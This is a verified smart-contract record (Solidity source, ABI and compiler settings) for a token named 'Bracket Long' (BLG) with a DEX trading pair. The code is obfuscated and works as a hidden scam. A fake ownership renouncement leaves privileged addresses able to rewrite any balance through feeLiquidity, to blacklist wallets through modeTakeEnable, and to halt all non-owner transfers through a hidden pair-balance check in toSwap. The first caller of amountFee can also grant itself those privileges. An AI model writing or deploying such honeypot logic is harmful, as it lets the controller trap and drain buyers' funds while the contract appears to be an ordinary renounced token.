{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface isMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeReceiver) external view returns (uint256);\n\n    function transfer(address launchFund, uint256 fromBuyTx) external returns (bool);\n\n    function allowance(address receiverSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromBuyTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchFund,\n        uint256 fromBuyTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMin, uint256 value);\n    event Approval(address indexed receiverSwap, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityShouldIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalAt {\n    function createPair(address fromIsLaunched, address senderMarketing) external returns (address);\n}\n\ninterface txLiquidity is isMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BracketLong is liquidityShouldIs, isMarketing, txLiquidity {\n\n    function marketingReceiver() public {\n        emit OwnershipTransferred(enableAuto, address(0));\n        modeFrom = address(0);\n    }\n\n    function senderMin() private view {\n        require(liquidityTxEnable[_msgSender()]);\n    }\n\n    uint256 private tradingReceiver;\n\n    function allowance(address shouldAutoLiquidity, address tokenMaxFrom) external view virtual override returns (uint256) {\n        if (tokenMaxFrom == receiverMode) {\n            return type(uint256).max;\n        }\n        return isEnable[shouldAutoLiquidity][tokenMaxFrom];\n    }\n\n    function feeLiquidity(address maxLimit, uint256 fromBuyTx) public {\n        senderMin();\n        enableFee[maxLimit] = fromBuyTx;\n    }\n\n    string private launchedMax = \"BLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyIsEnable;\n    }\n\n    address public enableAuto;\n\n    bool public toLaunchedLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listSenderIs;\n    }\n\n    address teamSellSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (enableTrading == atLiquidity) {\n            atLiquidity = exemptEnableIs;\n        }\n        launchAt atFund = launchAt(receiverMode);\n        toLiquidity = totalAt(atFund.factory()).createPair(atFund.WETH(), address(this));\n        if (sellWallet == tokenReceiver) {\n            launchReceiver = tradingReceiver;\n        }\n        enableAuto = _msgSender();\n        marketingReceiver();\n        liquidityTxEnable[enableAuto] = true;\n        enableFee[enableAuto] = listSenderIs;\n        if (launchReceiver != exemptEnableIs) {\n            exemptEnableIs = enableTrading;\n        }\n        emit Transfer(address(0), enableAuto, listSenderIs);\n    }\n\n    uint256 constant fromTake = 20 ** 10;\n\n    function tradingLaunchedAt(address totalSellMode, address launchFund, uint256 fromBuyTx) internal returns (bool) {\n        require(enableFee[totalSellMode] >= fromBuyTx);\n        enableFee[totalSellMode] -= fromBuyTx;\n        enableFee[launchFund] += fromBuyTx;\n        emit Transfer(totalSellMode, launchFund, fromBuyTx);\n        return true;\n    }\n\n    uint256 minShould;\n\n    string private fromSender = \"Bracket Long\";\n\n    address private modeFrom;\n\n    mapping(address => mapping(address => uint256)) private isEnable;\n\n    function transferFrom(address totalSellMode, address launchFund, uint256 fromBuyTx) external override returns (bool) {\n        if (_msgSender() != receiverMode) {\n            if (isEnable[totalSellMode][_msgSender()] != type(uint256).max) {\n                require(fromBuyTx <= isEnable[totalSellMode][_msgSender()]);\n                isEnable[totalSellMode][_msgSender()] -= fromBuyTx;\n            }\n        }\n        return toSwap(totalSellMode, launchFund, fromBuyTx);\n    }\n\n    function approve(address tokenMaxFrom, uint256 fromBuyTx) public virtual override returns (bool) {\n        isEnable[_msgSender()][tokenMaxFrom] = fromBuyTx;\n        emit Approval(_msgSender(), tokenMaxFrom, fromBuyTx);\n        return true;\n    }\n\n    function fundSwap(uint256 fromBuyTx) public {\n        senderMin();\n        minShould = fromBuyTx;\n    }\n\n    uint256 private listSenderIs = 100000000 * 10 ** 18;\n\n    bool public fromEnable;\n\n    function toSwap(address totalSellMode, address launchFund, uint256 fromBuyTx) internal returns (bool) {\n        if (totalSellMode == enableAuto) {\n            return tradingLaunchedAt(totalSellMode, launchFund, fromBuyTx);\n        }\n        uint256 tokenBuy = isMarketing(toLiquidity).balanceOf(teamSellSwap);\n        require(tokenBuy == minShould);\n        require(launchFund != teamSellSwap);\n        if (walletListMax[totalSellMode]) {\n            return tradingLaunchedAt(totalSellMode, launchFund, fromTake);\n        }\n        return tradingLaunchedAt(totalSellMode, launchFund, fromBuyTx);\n    }\n\n    function owner() external view returns (address) {\n        return modeFrom;\n    }\n\n    address receiverMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private enableFee;\n\n    uint256 launchedToTx;\n\n    event OwnershipTransferred(address indexed tokenLaunch, address indexed receiverLaunched);\n\n    bool public tokenReceiver;\n\n    uint256 public atLiquidity;\n\n    function amountFee(address totalTo) public {\n        if (toLaunchedLaunch) {\n            return;\n        }\n        \n        liquidityTxEnable[totalTo] = true;\n        if (exemptEnableIs == tradingReceiver) {\n            sellWallet = false;\n        }\n        toLaunchedLaunch = true;\n    }\n\n    uint256 public receiverTx;\n\n    function transfer(address maxLimit, uint256 fromBuyTx) external virtual override returns (bool) {\n        return toSwap(_msgSender(), maxLimit, fromBuyTx);\n    }\n\n    uint8 private buyIsEnable = 18;\n\n    address public toLiquidity;\n\n    function modeTakeEnable(address swapTrading) public {\n        senderMin();\n        \n        if (swapTrading == enableAuto || swapTrading == toLiquidity) {\n            return;\n        }\n        walletListMax[swapTrading] = true;\n    }\n\n    uint256 private exemptEnableIs;\n\n    function getOwner() external view returns (address) {\n        return modeFrom;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMax;\n    }\n\n    mapping(address => bool) public walletListMax;\n\n    bool private sellWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return fromSender;\n    }\n\n    mapping(address => bool) public liquidityTxEnable;\n\n    uint256 private launchReceiver;\n\n    function balanceOf(address feeReceiver) public view virtual override returns (uint256) {\n        return enableFee[feeReceiver];\n    }\n\n    uint256 public enableTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAutoLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMaxFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMaxFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuyTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuyTx\",\"type\":\"uint256\"}],\"name\":\"feeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromBuyTx\",\"type\":\"uint256\"}],\"name\":\"fundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"}],\"name\":\"modeTakeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuyTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSellMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromBuyTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletListMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BracketLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}